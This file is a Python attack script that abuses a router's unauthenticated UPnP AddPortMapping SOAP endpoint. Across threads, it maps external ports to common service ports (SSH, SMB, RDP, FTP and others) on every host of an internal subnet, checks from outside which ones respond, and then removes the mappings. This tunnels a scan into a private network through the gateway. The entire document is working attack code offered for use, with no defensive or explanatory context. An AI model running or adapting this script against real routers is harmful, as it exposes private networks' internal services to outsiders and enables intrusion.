#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import requests
from queue import Queue
from threading import Thread
import logging
from socket import *
import socket

THREADS_COUNT = 8
proxies = dict(http='127.0.0.1:8080')
upnp_host = sys.argv[1]
local_net = sys.argv[2]

def checkport(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, int(port)))
        s.shutdown(2)
        return True
    except:
        return False

def main(argv):
    setdefaulttimeout(15)
    q = Queue(maxsize=0)

    ports = ['21', '22', '23', '80', '443', '8080', '139', '445', '135', '3389', '110', '25', '49152']
    for h in range(1, 254):
        remote = 49153
        for i in ports:
            q.put_nowait((1, remote, '{}.{}'.format(local_net, h), i))
            remote += 1

    start_thread(q)


def start_thread(q):
    for i in range(THREADS_COUNT):
        worker = Thread(target=processor, args=(q,))
        worker.setDaemon(True)
        worker.start()
    q.join()


def processor(q, ):
    while not q.empty():
        item = q.get_nowait()
        add_portmap(q, item[1], item[2], item[3])
        q.task_done()
    return True


def add_portmap(q, remote, host, port):
    headers = {
        "User-agent": "Linux/2.6.32.11, UPnP/1.0, Portable SDK for UPnP devices/1.6.6",
        "SOAPAction": '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"',
        "Content-Type": "text/xml; charset=utf-8"
    }

    open_payload = "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\">" \
              "<NewRemoteHost>{}</NewRemoteHost><NewExternalPort>{}</NewExternalPort>" \
              "<NewProtocol>TCP</NewProtocol>" \
              "<NewInternalPort>{}</NewInternalPort>" \
              "<NewInternalClient>{}</NewInternalClient>" \
              "<NewEnabled>1</NewEnabled><NewPortMappingDescription>ssh</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>".format(upnp_host, remote, port, host)


    r = requests.post("http://{}:49152/upnp/control/WANIPConn1".format(upnp_host), proxies=proxies, allow_redirects=False, data=open_payload, headers=headers)

    if r.status_code == 200:
        if checkport(upnp_host, remote):
            print ("[+] host: {} port: {} open".format(host, port))

    headers_close = {
        "User-agent": "Linux/2.6.32.11, UPnP/1.0, Portable SDK for UPnP devices/1.6.6",
        "SOAPAction": '"urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping"',
        "Content-Type": "text/xml; charset=utf-8"
    }

    close_payload = "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:DeletePortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\">" \
                       "<NewRemoteHost>{}</NewRemoteHost><NewExternalPort>{}</NewExternalPort>" \
                       "<NewProtocol>TCP</NewProtocol>" \
                       "<NewInternalPort>{}</NewInternalPort>" \
                       "<NewInternalClient>{}</NewInternalClient>" \
                       "<NewEnabled>1</NewEnabled><NewPortMappingDescription>ssh</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:DeletePortMapping></s:Body></s:Envelope>".format(upnp_host, remote, port, host)

    r = requests.post("http://{}:49152/upnp/control/WANIPConn1".format(upnp_host), proxies=proxies, allow_redirects=False, data=close_payload, headers=headers_close)

if __name__ == '__main__':
    sys.exit(main(sys.argv))
